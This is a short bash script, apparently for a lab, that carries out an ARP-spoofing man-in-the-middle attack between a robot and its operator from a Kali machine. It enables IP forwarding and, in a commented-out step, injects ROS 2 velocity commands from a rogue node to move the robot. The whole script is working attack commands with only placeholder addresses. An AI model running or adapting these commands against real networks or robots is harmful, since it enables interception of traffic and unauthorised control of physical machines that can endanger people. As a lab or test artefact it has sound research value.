#!/usr/bin/env bash
# Run on machine C (Kali) unless noted otherwise.

# 1. ARP cache poisoning (both directions, so traffic from BOTH targets is
#    redirected through this machine)
sudo arpspoof -i eth0 -t <ROBOT_IP> <OPERATOR_IP> &
sudo arpspoof -i eth0 -t <OPERATOR_IP> <ROBOT_IP> &

# 2. enable IP forwarding so the redirected traffic is relayed, not dropped
sudo sysctl -w net.ipv4.ip_forward=1

# 3. rogue-node command injection (run on machine D instead)
# timeout 30 ros2 topic pub -r 10 /cmd_vel geometry_msgs/msg/Twist \
#   '{linear: {x: 0.5, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.5}}'
